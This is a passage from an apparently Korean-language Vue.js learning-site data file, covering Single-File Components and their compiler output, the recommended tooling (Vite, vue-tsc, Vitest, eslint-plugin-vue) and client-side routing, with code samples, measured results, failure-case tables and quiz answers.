        body: "<script setup> / <template> / <style scoped> 세 블록(+ 커스텀 블록). 왜 SFC인가: 익숙한 HTML·CSS·JS 문법으로 '모듈화된 컴포넌트', '본질적으로 결합된 관심사를 함께 둠', 템플릿 사전 컴파일, 컴포넌트 범위 CSS, Composition API 편의 문법, 템플릿·스크립트 교차 분석으로 컴파일 최적화, IDE 자동완성·타입 검사, HMR. 동작: '@vue/compiler-sfc가 표준 JS·CSS로 컴파일'. 컴파일된 SFC는 표준 ES 모듈이라 import App from './App.vue'. <style>은 개발에서 네이티브 <style>로 주입(HMR), 운영에서 하나의 CSS 파일로 추출. SFC Playground에서 컴파일 결과를 볼 수 있음. 관심사 분리: '파일 타입 분리(HTML/CSS/JS)가 관심사 분리의 조건은 아니다. 한 컴포넌트의 템플릿·로직·스타일은 서로 결합되어 있고 함께 두는 쪽이 응집도가 높다'. 대안: 빌드 없이는 petite-vue(~6kB, 더는 활발히 유지되지 않음). JS·CSS를 따로 두고 싶으면 <script src=\"./x.js\"> <style src=\"./x.css\">. 참고서의 SFC 문법 명세·<script setup>·CSS 기능 노드가 세부입니다.",
        code: "<!-- MyComponent.vue -->\n<script setup>\nimport { ref } from 'vue'\nconst greeting = ref('Hello World!')\n</script>\n\n<template>\n  <p class=\"greeting\">{{ greeting }}</p>\n</template>\n\n<style scoped>\n.greeting { color: red; font-weight: bold; }\n</style>\n\n// 컴파일되면 (개념) — 표준 ES 모듈\nimport { ref, createElementVNode as _c, toDisplayString as _d } from 'vue'\nexport default { __name: 'MyComponent', setup(__props) { const greeting = ref('Hello World!'); return (_ctx, _cache) => _c('p', { class: 'greeting' }, _d(greeting.value), 1 /* TEXT */) } }\n// + CSS: .greeting[data-v-7a7a37b1] { color: red; … }   (개발: <style> 주입 · 운영: 추출)",
        terms: [
          {
            term: "@vue/compiler-sfc",
            body: "SFC를 파싱(parse)하고 각 블록을 컴파일하는 패키지입니다. compileScript는 <script setup>의 매크로를 풀어 setup 함수와 props·emits 선언을 만들고(실제로 defineModel → _useModel, defineExpose → __expose), compileTemplate은 템플릿을 렌더 함수로, compileStyle은 scoped·module·v-bind()를 처리합니다(실제로 data-v 해시 선택자, var(--hash-name)). Vite의 @vitejs/plugin-vue와 vue-loader가 이것을 감싸고, vue/compiler-sfc로도 import할 수 있습니다.",
          },
          {
            term: "HMR (Hot Module Replacement)",
            body: "파일을 저장하면 페이지를 새로 고치지 않고 바뀐 모듈만 교체하는 개발 서버 기능입니다. SFC는 블록 단위로 컴파일되므로 <template>만 바꾸면 렌더 함수만, <style>만 바꾸면 <style> 태그만 교체해 컴포넌트 상태가 유지됩니다. 개발에서 <style>을 네이티브 태그로 주입하는 이유가 이것입니다. Vite가 ESM 기반으로 빠르게 합니다(툴링 노드).",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node의 @vue/compiler-sfc로 parse → compileScript했습니다. <script setup lang=\"ts\">의 const { msg = 'hi', count } = defineProps<{ msg?: string; count: number }>(), defineModel<string>({ required: true }), defineEmits<{ change: [id: number] }>(), defineExpose({ model })은 export default { props: _mergeModels({ msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }, { modelValue: { type: String, ...{ required: true } }, modelModifiers: {} }), emits: _mergeModels([\"change\"], [\"update:modelValue\"]), setup(__props, { expose: __expose, emit: __emit }) { const model = _useModel(__props, \"modelValue\"); const emit = __emit; watch(() => __props.count, …); __expose({ model }); return (_ctx, _cache) => … } }가 됐습니다(inlineTemplate). 매크로는 import 없이 쓰이고 전부 사라집니다. compileStyle(scoped, id 'data-v-abc123')은 .a { } → .a[data-v-abc123] { }, .a :deep(.b) → .a[data-v-abc123] .b, :slotted(div) → div[data-v-abc123-s], :global(.g) → .g, p { font-size: v-bind(size) } → p[data-v-abc123] { font-size: var(--abc123-size) }, v-bind('theme.color') → var(--abc123-theme\\.color)로 바꿨고, 스크립트 쪽에는 _useCssVars(_ctx => ({ … }))가 추가됐습니다. 템플릿 컴파일(compiler-dom)은 정적 노드 캐시(-1), 패치 플래그(TEXT·CLASS), 핸들러 캐시(_cache[n])를 남겼습니다. 서버에서 template 문자열을 가진 컴포넌트를 renderToString하니 런타임 컴파일되어 <button>1</button>이 나왔습니다(서버 빌드는 컴파일러 포함).",
        code: "// compileScript (vue 3.5.45)\n<script setup lang=\"ts\"> defineProps<…>() / defineModel / defineEmits / defineExpose\n→ export default { props: _mergeModels({ msg: {…default:'hi'}, count: {…required:true} }, { modelValue: …, modelModifiers: {} }),\n                   emits: _mergeModels([\"change\"], [\"update:modelValue\"]),\n                   setup(__props, { expose: __expose, emit: __emit }) { const model = _useModel(__props, \"modelValue\"); … __expose({ model }); return (_ctx, _cache) => (…) } }\n\n// compileStyle (scoped · id data-v-abc123)\n.a { }                    → .a[data-v-abc123] { }\n.a :deep(.b) { }          → .a[data-v-abc123] .b { }\n:slotted(div) { }         → div[data-v-abc123-s] { }\n:global(.g) { }           → .g { }\np { font-size: v-bind(size) }          → p[data-v-abc123] { font-size: var(--abc123-size) }   + 스크립트: _useCssVars(_ctx => ({ … }))\n.c { color: v-bind('theme.color') }    → .c[data-v-abc123] { color: var(--abc123-theme\\.color) }",
      },
      {
        label: "문제: 'HTML·CSS·JS 를 한 파일에 섞는 건 관심사 분리 위반' 이라는 반대",
        body: "팀 리뷰에서 .vue 파일이 세 언어를 섞는다고 반대가 나왔습니다. 문서의 답은 '관심사 분리는 파일 타입 분리와 같지 않다'입니다. 한 컴포넌트의 템플릿·로직·스타일은 서로를 전제하는 하나의 관심사이고, 세 파일로 나누면 응집도가 떨어지고 수정할 때 세 곳을 오갑니다. 그리고 .vue는 '섞어 쓰는 HTML 파일'이 아닙니다. 컴파일러가 세 블록을 각각 분석해 ES 모듈 + CSS로 바꾸고(실제로 매크로 치환, scoped 해시), 그 교차 분석이 최적화(어느 바인딩이 setup 변수인가, 어느 스타일이 이 컴포넌트 것인가)의 재료입니다. 정말 파일을 나눠야 하면 <script src> <style src>로 나누되 .vue가 묶음의 단위로 남습니다. 큰 관심사(데이터 접근, 도메인 로직)는 컴포저블·스토어로 .vue 밖에 둡니다.",
      },
      {
        label: "문제가 나는 경우: 컴파일 산물을 모를 때",
        body: "경우 ㄱ, 관심사 분리 오해입니다. 위의 사고입니다. 경우 ㄴ, CDN(빌드 없음)에서 .vue import. 컴파일이 없어 안 됨. 빌드 도구. 경우 ㄷ, <template>이 둘. 하나만(문법 명세). 경우 ㄹ, 보통 <script>와 <script setup>에 같은 옵션. props·emits는 setup 매크로로만(경고). 경우 ㅁ, 매크로를 import함. import 불필요(컴파일러 매크로). 지워도 됨. 경우 ㅂ, 매크로 인자에 setup 로컬 변수. 모듈 스코프로 끌어올려져 참조 불가(문서). 경우 ㅅ, scoped 스타일이 자식 컴포넌트 안에 안 먹음. 해시 속성이 자식 루트까지만. :deep(). 경우 ㅇ, 운영에서 <style> 태그를 기대. 추출되어 CSS 파일. 경우 ㅈ, HMR이 상태를 잃음. <script> 변경은 재마운트(설계). 템플릿·스타일만 유지. 경우 ㅊ, 파일명으로 추론된 name을 모르고 KeepAlive include가 안 맞음. 파일명 = name. 경우 ㅋ, src import 경로가 ./ 없이. 모듈 요청으로 해석. ./ 접두. 경우 ㅌ, 커스텀 블록(<i18n>)이 무시됨. 빌드 도구 플러그인이 처리해야.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ 분리 오해        리뷰 반대                           -                              관심사 ≠ 파일 타입 · 큰 관심사는 컴포저블\nㄴ CDN .vue        빌드 없이 import                     안 됨                           create-vue\nㄷ template 둘      블록 중복                           컴파일 에러                       하나\nㄹ 옵션 중복        <script> 에 props + setup 매크로       경고                            매크로만\nㅁ 매크로 import     import { defineProps }               불필요 (경고)                     제거\nㅂ 로컬 참조        defineProps({ default: localVar })    참조 불가 (문서)                   모듈 스코프 · import\nㅅ scoped 자식      자식 내부 선택자                     안 먹음 (실제로 해시 속성)           :deep()\nㅇ 운영 style 태그   추출됨                              CSS 파일                         -\nㅈ HMR 상태        <script> 수정                       재마운트                          설계\nㅊ name 추론        include 불일치                       파일명 = name                    파일명 맞추기\nㅋ src 경로        src=\"x.js\"                          모듈 요청                         ./x.js\nㅌ 커스텀 블록       <i18n> 무시                          플러그인 필요                     vite-plugin",
        codeLang: "text",
      },
      {
        label: "문제의 구조: SFC 는 '컴파일되는 묶음' 이라 묶여서 좋은 것과 컴파일이 필요한 것이 같은 자리에 있다",
        body: "SFC의 이점은 전부 '세 블록이 한 컴파일러를 지난다'에서 나옵니다. 템플릿이 setup 변수를 직접 참조하고(inline 렌더), 스타일이 컴포넌트 범위를 갖고(해시), 매크로가 선언으로 풀리고(ㅁ, ㅂ), HMR이 블록 단위로 됩니다(ㅈ). 같은 이유로 제약이 생깁니다. 컴파일러가 있어야 하고(ㄴ), 블록 수와 매크로 자리가 정해지고(ㄷ, ㄹ), 범위 스타일의 경계(ㅅ)와 추출(ㅇ)이 빌드 설정에 달립니다. 관심사 분리 논쟁(ㄱ)은 그 묶음이 '한 컴포넌트'라는 응집 단위라는 것을 보면 풉니다. 처방은 .vue를 '한 컴포넌트의 응집 단위'로 두고, 컴포넌트를 넘는 관심사는 컴포저블·스토어로 빼고, 컴파일 산물(렌더 함수·해시 CSS)을 Playground에서 한 번 보는 것입니다.",
        code: ".vue = <template> + <script setup> + <style>  ──@vue/compiler-sfc──▶  ES 모듈 (setup + 렌더 함수 + props/emits 선언) + CSS (해시)\n  이점:  템플릿 ↔ setup 직접 참조 · 범위 스타일 · 매크로 → 선언 (ㅁ ㅂ) · 블록 단위 HMR (ㅈ) · 교차 분석 최적화\n  제약:  컴파일러 필요 (ㄴ) · 블록·매크로 자리 (ㄷ ㄹ) · 범위 경계 (ㅅ) · 추출 설정 (ㅇ)\n\n.vue = 한 컴포넌트의 응집 단위 (ㄱ) · 넘는 관심사 → 컴포저블 · 스토어",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "SFC를 컴파일하고 검사하고 테스트하는 도구들이 다음 페이지 '툴링'입니다. 실제로 돌려 보면 컴파일러 포함 브라우저 빌드는 576KB, 운영 빌드는 178KB였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 디자이너가 CSS를 따로 관리하고 싶어 합니다. SFC를 유지하면서 가능한가요? (2) 자식 컴포넌트의 .item을 부모의 scoped 스타일로 바꾸려는데 안 됩니다. 왜고 어떻게? (3) <script setup>의 defineProps 기본값에 상단의 const DEFAULTS를 참조했더니 에러입니다. 왜?",
        notes: [
          {
            title: "답",
            body: "(1) <style scoped src=\"./MyComponent.css\"></style>로 스타일을 별도 파일에 두되 .vue가 참조합니다. 컴파일러는 그 파일을 그 컴포넌트의 scoped 스타일로 처리해 해시를 붙입니다(상대 경로는 ./로). 응집 단위는 .vue에 남고 파일만 분리됩니다. 전역 디자인 토큰은 보통 전역 CSS로 두고 컴포넌트 고유 규칙만 scoped로 둡니다. (2) scoped는 선택자마다 [data-v-해시]를 붙이고 그 속성은 이 컴포넌트의 요소와 자식의 루트 요소에만 붙습니다. 자식 안쪽 .item에는 없어 .item[data-v-xxx]가 안 맞습니다(실제로 .a → .a[data-v-abc123]). .parent :deep(.item)으로 쓰면 .parent[data-v-xxx] .item으로 컴파일되어(실제로 확인) 자식 안쪽까지 닿습니다. (3) 매크로 인자는 컴파일러가 setup 밖 모듈 스코프로 끌어올려 props 옵션으로 만듭니다. setup 안에서 선언된 로컬 변수는 그 자리에서 보이지 않습니다(문서: '로컬 변수를 참조할 수 없음. import는 가능'). DEFAULTS를 별도 모듈에서 import하거나, 3.5의 구조 분해 기본값 const { size = 'md' } = defineProps(…)처럼 리터럴로 적습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Single-File Components", href: `${DOCS}/guide/scaling-up/sfc` },
      { label: "SFC Syntax Specification", href: `${DOCS}/api/sfc-spec` },
      { label: "SFC CSS Features", href: `${DOCS}/api/sfc-css-features` },
    ],
  },

  {
    id: "vg-scale-tooling",
    name: "툴링",
    tagline: "Vite 로 만들고, Vue - Official 로 쓰고, vue-tsc 로 검사하고, Vitest 로 테스트한다",
    intro:
      "확장하기 둘째 페이지입니다. 권장 도구 묶음입니다. 프로젝트 생성은 Vite 기반 create-vue(npm create vue@latest). Vue CLI(webpack)는 '유지 관리 모드'. 온라인은 SFC Playground와 StackBlitz. IDE는 VS Code + Vue - Official 확장(구 Volar. Vetur 대체, Vue 3에서는 Vetur 비활성화), WebStorm. 타입 검사는 vue-tsc(tsc 래퍼. 개발 서버는 트랜스파일만 하므로 타입 에러는 IDE나 vue-tsc로). 테스트는 Vitest(단위·컴포넌트), Cypress·Playwright(E2E). 린트는 eslint-plugin-vue, 포맷은 Vue - Official 또는 Prettier. Vue 빌드: 런타임 전용(vue.runtime.*)이 기본이고 템플릿 컴파일러를 포함한 전체 빌드는 약 14kb 더. 저수준 패키지 @vue/compiler-sfc, @vitejs/plugin-vue, vue-loader. 실제로 돌려 보면 vue 3.5.45의 브라우저 빌드는 컴파일러 포함 개발 575,931바이트, 운영 177,765바이트였고, @vue/compiler-sfc를 Node에서 직접 불러 SFC를 컴파일할 수 있었습니다. 이 노드의 질문은 하나입니다. 어느 도구가 어느 단계를 맡나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "생성: npm create vue@latest(create-vue, Vite). 'Vue CLI는 유지 관리 모드. webpack 전용 기능이 필요하지 않으면 Vite로'. 온라인: Vue SFC Playground(play.vuejs.org, 컴파일 결과 확인), Vue + Vite on StackBlitz. IDE: VS Code + 'Vue - Official'(이전 Volar. 'Vetur를 대체. Vue 3 프로젝트에서는 Vetur 비활성화'). WebStorm 내장 지원. 브라우저 DevTools: Vue Devtools 확장. 타입 검사: 'Vite 개발 서버와 esbuild는 트랜스파일만 하고 타입 검사는 안 함. 개발 중 타입 에러는 IDE가, CLI·CI는 vue-tsc(tsc 래퍼. --watch 또는 vite-plugin-checker)'. 테스트: 단위·컴포넌트는 Vitest(Vite 설정 공유, 빠름), E2E는 Cypress(컴포넌트 테스트도) 또는 Playwright. 'Jest는 기존 스위트 이전에만'. 린트: eslint-plugin-vue(SFC 규칙). 포맷: Vue - Official 또는 Prettier. 빌드 종류: 런타임 전용 vue.runtime.esm-bundler.js(기본. 템플릿은 빌드 때 컴파일), 전체 빌드(런타임 컴파일러 포함, 약 14kb 추가. 브라우저에서 template 문자열을 쓰면 필요. alias 'vue': 'vue/dist/vue.esm-bundler.js'). 저수준: @vue/compiler-sfc(vue/compiler-sfc로 import), @vitejs/plugin-vue, vue-loader(webpack).",
        code: "# 생성 · 개발 · 빌드\nnpm create vue@latest && cd app && npm i && npm run dev     # Vite\nnpm run build                                             # 런타임 전용 Vue + 미리 컴파일된 템플릿\n\n# 타입 검사 (개발 서버는 안 함)\nnpx vue-tsc --noEmit           # CI · 또는 vite-plugin-checker\n\n# 테스트 · 린트\nnpx vitest                     # 단위 · 컴포넌트 (@vue/test-utils)\nnpx playwright test            # E2E\nnpx eslint . (eslint-plugin-vue)\n\n// 브라우저에서 template 문자열을 쓰려면 — 전체 빌드 alias\n// vite.config.js\nexport default { resolve: { alias: { vue: 'vue/dist/vue.esm-bundler.js' } } }   // +~14kb\n\n// 저수준\nimport { parse, compileScript, compileStyle } from 'vue/compiler-sfc'",
        terms: [
          {
            term: "런타임 전용 빌드와 전체 빌드",
            body: "Vue 패키지에는 두 종류의 빌드가 있습니다. 런타임 전용(vue.runtime.*)은 템플릿 컴파일러가 없어 작고, 템플릿은 빌드 도구가 미리 렌더 함수로 바꿔 둔 것만 돕니다. 전체 빌드는 컴파일러가 들어 있어 template: '<div>…</div>' 문자열이나 in-DOM 템플릿을 런타임에 컴파일합니다. 번들러 환경의 'vue' import는 기본으로 런타임 전용이고, 런타임 컴파일이 필요하면 alias로 esm-bundler 전체 빌드를 가리킵니다. 실제로 CDN용 esm-browser 빌드는 컴파일러 포함 576KB(개발)였습니다.",
          },
          {
            term: "vue-tsc",
            body: "TypeScript 컴파일러 tsc를 감싸 .vue 파일의 <script lang=\"ts\">와 템플릿 식까지 타입 검사하는 CLI입니다. Vite의 esbuild는 타입을 지우기만 하고 검사하지 않으므로, CI에서 vue-tsc --noEmit을 돌려야 타입 에러가 빌드를 막습니다. Vue - Official 확장이 에디터에서 같은 검사를 보여 줍니다. 선언 파일(.d.ts) 생성에도 쓰입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "vue 3.5.45 패키지의 dist를 보니 브라우저용 ESM 빌드는 vue.esm-browser.js 575,931바이트(개발, 컴파일러 포함)와 vue.esm-browser.prod.js 177,765바이트(운영)였습니다. 번들러용은 vue.esm-bundler.js(전체)와 vue.runtime.esm-bundler.js(런타임 전용)가 따로 있고 문서는 차이를 약 14kb로 적습니다. Node에서 vue/compiler-sfc의 parse·compileScript·compileStyle과 @vue/compiler-dom의 compile을 직접 불러 SFC 매크로 치환, scoped CSS 변환, 템플릿 → 렌더 함수, 컴파일 에러 문구를 확인했습니다(SFC·템플릿 노드). 서버의 renderToString은 template 문자열 컴포넌트를 런타임 컴파일했습니다(서버 번들은 전체 빌드). Chrome에서 쓴 vue.esm-browser.js는 템플릿 문자열을 바로 컴파일했고 컴파일 에러를 '[Vue warn]: Template compilation error: …'로 냈습니다(Transition 자식 둘). 블로그의 측정 환경 자체가 Vite 없이 esm-browser(전체 빌드)를 쓴 것이라, 운영 앱의 번들은 이보다 작습니다.",
        code: "// vue 3.5.45 dist\nvue.esm-browser.js         575,931 B   개발 · 컴파일러 포함 (CDN · 측정에 쓴 것)\nvue.esm-browser.prod.js    177,765 B   운영\nvue.esm-bundler.js / vue.runtime.esm-bundler.js    번들러용 전체 / 런타임 전용 (문서: 약 14kb 차이)\n\n// 직접 부른 저수준 패키지\nvue/compiler-sfc:  parse · compileScript (매크로 → 선언) · compileStyle (scoped 해시 · v-bind → var)\n@vue/compiler-dom: compile (템플릿 → 렌더 함수 · 패치 플래그 · 에러 문구)\n브라우저 전체 빌드: template 문자열 컴파일 · '[Vue warn]: Template compilation error: …'",
        codeLang: "text",
      },
      {
        label: "문제: CI 가 통과했는데 운영에서 타입 에러로 터진다",
        body: "Vite 빌드는 성공했는데 배포 후 undefined 접근으로 터지고, 로컬 에디터에는 빨간 줄이 있었습니다. Vite(esbuild)는 TypeScript를 트랜스파일만 하고 타입을 검사하지 않습니다. 문서가 명시하는 함정입니다. 빌드 성공은 타입 정합을 뜻하지 않습니다. 처방은 CI에 vue-tsc --noEmit을 추가해 .vue의 <script lang=\"ts\>와 템플릿 식까지 검사하고 실패하면 빌드를 막는 것입니다. 로컬에서는 vite-plugin-checker로 개발 서버에 검사를 띄우거나 vue-tsc --watch. 에디터는 Vue - Official이 같은 검사를 보여 줍니다(Vetur는 끄기). 타입 에러를 린트와 같은 '게이트'로 두는 것이 툴링 페이지의 요지입니다.",
      },
      {
        label: "문제가 나는 경우: 도구의 역할을 모를 때",
        body: "경우 ㄱ, 타입 검사 없는 빌드입니다. 위의 사고입니다. 경우 ㄴ, Vetur와 Vue - Official 둘 다 켬. 충돌·중복 경고. Vetur 끄기. 경우 ㄷ, 새 프로젝트를 Vue CLI로. 유지 관리 모드. create-vue. 경우 ㄹ, 번들러 환경에서 template 문자열이 안 됨. 런타임 전용 빌드. alias 전체 빌드 또는 SFC. 경우 ㅁ, CDN 개발 빌드를 운영에. 576KB·경고 코드. .prod.js. 경우 ㅂ, Jest로 새 프로젝트. 문서는 Vitest 권장(Vite 설정 공유). 경우 ㅅ, 컴포넌트 테스트를 E2E로만. 느림. Vitest + Test Utils. 경우 ㅇ, eslint-plugin-vue 없이 ESLint. SFC 규칙(v-for key 등) 못 잡음. 추가. 경우 ㅈ, Prettier와 Vue - Official 포맷터 충돌. 하나로. 경우 ㅊ, compiler-sfc를 직접 쓰려다 버전 불일치. vue/compiler-sfc 경로로 같은 버전. 경우 ㅋ, Playground 없이 컴파일 결과를 추측. play.vuejs.org에서 확인. 경우 ㅌ, DevTools 없이 상태 추적. Vue Devtools 확장.",
        code: "경우               언제 생기나                       겉모습                           처방\nㄱ 타입 미검사       Vite 빌드만                        운영 타입 에러                     vue-tsc --noEmit (CI)\nㄴ 확장 중복        Vetur + Vue - Official             충돌                             Vetur 끄기\nㄷ Vue CLI 신규      webpack                           유지 관리 모드                     create-vue\nㄹ template 문자열   런타임 전용 빌드                    컴파일 안 됨                       alias 전체 빌드 · SFC\nㅁ 개발 빌드 운영     esm-browser.js                     576KB                           .prod.js\nㅂ Jest 신규        Vitest 대신                        설정 중복 · 느림                    Vitest\nㅅ E2E 만          컴포넌트도 브라우저로                 느림                             Vitest + Test Utils\nㅇ 플러그인 없음     기본 ESLint                        SFC 규칙 못 잡음                    eslint-plugin-vue\nㅈ 포맷터 둘        Prettier + 확장                     충돌                             하나\nㅊ 버전 불일치       @vue/compiler-sfc 따로 설치           불일치                           vue/compiler-sfc\nㅋ 결과 추측        컴파일 산물 모름                     오해                             SFC Playground\nㅌ DevTools 없음     상태 디버깅                        어려움                           Vue Devtools",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 도구는 '단계' 마다 하나씩이고, 한 도구가 다른 단계를 대신하지 않는다",
        body: "SFC 하나가 사용자에게 가기까지 단계가 있습니다. 쓰기(IDE: Vue - Official) → 컴파일(Vite + @vitejs/plugin-vue → compiler-sfc) → 타입 검사(vue-tsc. 컴파일과 별개 ㄱ) → 린트(eslint-plugin-vue ㅇ) → 테스트(Vitest 단위·컴포넌트, Playwright E2E ㅅ, ㅂ) → 번들(런타임 전용 Vue + 미리 컴파일된 템플릿 ㄹ, ㅁ) → 실행(DevTools ㅌ). 사고는 한 도구가 다른 단계를 대신한다고 믿을 때 납니다. 빌드 성공 = 타입 정합(ㄱ), 기본 ESLint = SFC 검사(ㅇ), 개발 빌드 = 운영 빌드(ㅁ). 처방은 단계마다 도구를 하나씩 두고 CI에서 전부 게이트로 묶는 것입니다. create-vue가 그 묶음을 선택지로 묻습니다.",
        code: "쓰기 (Vue - Official) → 컴파일 (Vite · plugin-vue · compiler-sfc) → 타입 (vue-tsc ㄱ) → 린트 (eslint-plugin-vue ㅇ) → 테스트 (Vitest · Playwright ㅂ ㅅ) → 번들 (런타임 전용 ㄹ ㅁ) → 실행 (DevTools ㅌ)\n한 도구는 한 단계 · CI 는 전부 게이트 · create-vue 가 묶음을 묻는다",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "도구를 갖춘 앱이 페이지 여럿이 될 때 URL과 화면을 맞추는 것이 다음 페이지 '라우팅'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 기존 webpack(Vue CLI) 프로젝트가 있습니다. 옮겨야 할까요? (2) 마크다운에서 받은 템플릿 문자열을 런타임에 컴포넌트로 렌더해야 합니다. 어떻게? (3) PR마다 타입·린트·테스트를 자동으로 막으려면 CI 스크립트는?",
        notes: [
          {
            title: "답",
            body: "(1) 문서는 Vue CLI를 유지 관리 모드로 두고 'webpack 전용 기능이 꼭 필요하지 않으면 Vite'를 권합니다. 동작하는 프로젝트를 급히 옮길 필요는 없지만, 새 기능(빠른 HMR, Vitest 설정 공유, vue-tsc 흐름)을 쓰려면 create-vue 프로젝트를 만들어 소스를 옮기는 것이 보통의 길입니다. webpack 플러그인에 깊이 의존하면 남겨도 됩니다. (2) 번들러의 기본 'vue'는 런타임 전용이라 template 문자열을 컴파일하지 못합니다. 두 길입니다. vite.config의 resolve.alias로 vue를 'vue/dist/vue.esm-bundler.js'(전체 빌드, 약 14kb 추가)로 가리켜 { template: str } 컴포넌트를 쓰거나, 서버에서 미리 컴파일(compiler-dom)해 렌더 함수 코드를 내려보냅니다. 신뢰할 수 없는 문자열을 템플릿으로 쓰는 것은 보안 페이지가 금하는 일이니 소스를 통제합니다. (3) package.json에 \"typecheck\": \"vue-tsc --noEmit\", \"lint\": \"eslint .\", \"test\": \"vitest run\"을 두고 CI에서 npm run typecheck && npm run lint && npm run test && npm run build를 순서대로 돌립니다. Vite 빌드는 타입을 검사하지 않으므로 vue-tsc가 빠지면 타입 에러가 통과합니다. E2E는 빌드 산물로 별도 잡에서 npx playwright test.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Tooling", href: `${DOCS}/guide/scaling-up/tooling` },
      { label: "Quick Start", href: `${DOCS}/guide/quick-start` },
      { label: "TypeScript Overview — Project Setup", href: `${DOCS}/guide/typescript/overview#project-setup` },
    ],
  },

  {
    id: "vg-scale-routing",
    name: "라우팅",
    tagline: "URL 을 화면에 맞추는 일 — 공식은 Vue Router, 원리는 History API 와 <component :is>",
    intro:
      "확장하기 셋째 페이지입니다. 서버 라우팅은 URL마다 서버가 다른 HTML을 주는 것이고, 클라이언트 라우팅은 SPA가 '브라우저가 요청을 보내기 전에 가로채' History API(또는 hashchange)로 URL만 바꾸고 화면을 스스로 바꾸는 것입니다. 공식 라이브러리는 Vue Router(중첩 라우트, 동적 세그먼트, 가드, 지연 로드). 문서는 원리를 보이기 위해 아주 단순한 라우터를 손으로 만듭니다. routes 맵(경로 → 컴포넌트), hashchange로 갱신되는 currentPath ref, computed로 고른 컴포넌트를 <component :is>로 렌더, 없으면 NotFound. 이 페이지는 짧고 이 블로그에서 Vue Router 자체는 측정하지 않았습니다. 관련 측정은 <component :is>의 전환이 언마운트라는 것(KeepAlive로 유지), 비동기 컴포넌트의 로딩(라우트 지연 로드가 같은 원리), 그리고 서버 렌더가 요청마다 앱을 새로 만든다는 것입니다. 이 노드의 질문은 하나입니다. URL이 바뀌면 누가 무엇을 바꾸나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "서버 측 vs 클라이언트 측: SPA는 '네비게이션을 가로채 History API로 URL을 갱신하고 전체 새로고침 없이 화면을 바꾼다'. 그래서 뷰 전환이 즉각적이고 상태가 유지됩니다. 공식: Vue Router. 중첩 라우트 매핑, 동적 라우팅, 모듈식 컴포넌트 기반 설정, 라우트 params·query·wildcards, 전환 효과, 세밀한 네비게이션 제어, 자동 active 클래스 링크, HTML5 history/hash 모드, 커스텀 스크롤 동작, URL 인코딩. 손으로 만든 라우터(문서 예): const routes = { '/': Home, '/about': About }; const currentPath = ref(window.location.hash); window.addEventListener('hashchange', () => { currentPath.value = window.location.hash }); const currentView = computed(() => routes[currentPath.value.slice(1) || '/'] || NotFound); 템플릿 <a href=\"#/\">Home</a> <component :is=\"currentView\" />. 라우트 컴포넌트 지연 로드는 Vue Router에서 component: () => import('./views/About.vue')로 하고(Suspense는 깨우지 않음), 전환·캐시는 <RouterView v-slot=\"{ Component }\">와 Transition·KeepAlive 조합(내장 컴포넌트 노드).",
        code: "// 원리 — 아주 단순한 라우터 (문서)\nimport { ref, computed } from 'vue'\nimport Home from './Home.vue'; import About from './About.vue'; import NotFound from './NotFound.vue'\nconst routes = { '/': Home, '/about': About }\nconst currentPath = ref(window.location.hash)\nwindow.addEventListener('hashchange', () => { currentPath.value = window.location.hash })\nconst currentView = computed(() => routes[currentPath.value.slice(1) || '/'] || NotFound)\n\n<template>\n  <a href=\"#/\">Home</a> | <a href=\"#/about\">About</a>\n  <component :is=\"currentView\" />\n</template>\n\n// 실제 — Vue Router\nimport { createRouter, createWebHistory } from 'vue-router'\nconst router = createRouter({ history: createWebHistory(), routes: [\n  { path: '/', component: Home },\n  { path: '/about', component: () => import('./About.vue') },        // 지연 로드 (코드 분할)\n  { path: '/users/:id', component: User, props: true },\n] })\napp.use(router)\n<RouterView v-slot=\"{ Component }\"><KeepAlive><component :is=\"Component\" /></KeepAlive></RouterView>",
        terms: [
          {
            term: "클라이언트 라우팅 (client-side routing)",
            body: "SPA가 링크 클릭을 가로채 서버 요청 없이 history.pushState(또는 location.hash)로 URL만 바꾸고, 그 URL에 맞는 컴포넌트를 스스로 그리는 방식입니다. 서버는 어느 경로로 와도 같은 index.html을 돌려줘야 하고(history 모드. hash 모드는 필요 없음), 뒤로가기는 popstate로 받습니다. 렌더링 노드 1장(네비게이션)의 문서 교체가 없는 대신, 데이터 로딩·스크롤·포커스·제목 갱신을 앱이 직접 챙겨야 합니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 라우터가 서는 자리들",
        body: "Vue Router 자체는 이 블로그에서 돌리지 않았습니다. 라우터가 쓰는 Vue 기능의 측정을 모았습니다. <component :is>로 컴포넌트를 바꾸면 이전 것은 unmounted되고 상태가 사라졌으며 KeepAlive로 감싸면 activated/deactivated로 유지됐습니다(A:1). 비동기 컴포넌트는 로딩 중 loadingComponent, 실패 시 errorComponent로 갔습니다. 라우트의 () => import()도 같은 코드 분할이지만 Suspense를 깨우지 않는다고 문서가 적습니다. Transition은 요소 교체에 클래스를 붙였고 mode=\"out-in\"에서 after-leave 뒤 before-enter였습니다. 서버 렌더는 요청마다 createSSRApp으로 새 앱을 만들었고 모듈 전역은 공유됐습니다(라우터 인스턴스도 요청마다 만들어야 하는 이유). 템플릿 전역 허용 목록에 window·location이 없어 템플릿에서 직접 URL을 읽을 수 없고 setup에서 ref로 받아야 합니다(손 라우터 예제가 ref(window.location.hash)로 받는 이유).",
        code: "라우터가 쓰는 것                 측정 (앞 노드들)\n<component :is> 전환             이전 컴포넌트 unmounted · 상태 소실 → KeepAlive 로 activated/deactivated · A:1 유지\n() => import() 지연 로드          비동기 컴포넌트: loading → 도착 / error / timeout (Router 라우트는 Suspense 를 깨우지 않음 — 문서)\n전환                             Transition · mode=\"out-in\": after-leave → before-enter → after-enter\nSSR                              요청마다 createSSRApp · 모듈 전역은 공유 (라우터도 요청마다)\n템플릿에서 URL                    window·location 은 허용 목록 밖 → setup 에서 ref 로",
        codeLang: "text",
      },
      {
        label: "문제: 새로고침하면 404 가 난다",
